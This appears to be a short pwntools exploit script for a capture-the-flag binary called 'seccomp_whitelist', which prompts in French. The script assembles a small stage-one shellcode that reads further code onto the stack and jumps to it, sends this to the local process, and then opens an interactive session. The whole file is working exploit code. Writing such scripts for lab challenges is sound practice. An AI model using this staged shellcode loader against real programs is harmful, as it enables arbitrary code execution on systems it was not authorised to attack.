from pwn import *

exe = ELF('./seccomp_whitelist')
context.arch = 'amd64'

def conn():
    if args.GDB:
        return gdb.debug(exe.path)
    else:
        return process(exe.path)

shellcode1 = asm(f'''
    xor rax, rax
    xor rdi, rdi
    mov rsi, rsp
    mov rdx, 0x100
    syscall
    jmp rsi
''')

io = conn()
io.sendafter(b"Entrez votre shellcode : ", shellcode1)

io.interactive()